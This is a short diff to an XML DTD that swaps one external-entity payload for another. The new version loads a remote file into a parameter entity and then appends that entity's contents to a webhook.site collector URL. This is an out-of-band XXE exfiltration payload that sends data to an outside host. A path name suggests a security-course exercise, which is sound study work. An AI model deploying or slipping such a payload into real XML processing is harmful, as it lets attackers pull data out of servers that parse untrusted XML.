@@ -1,2 +1,3 @@
-<!ENTITY % gh SYSTEM "https://webhook.site/ca530734-b049-49de-a4c1-57b9e877d840/dtd-from-github">
-%gh;
+<!ENTITY % gh SYSTEM "https://xpamoff.github.io/ib-course/probe.txt">
+<!ENTITY % exfil SYSTEM "https://webhook.site/ca530734-b049-49de-a4c1-57b9e877d840/?d=%gh;">
+%exfil;
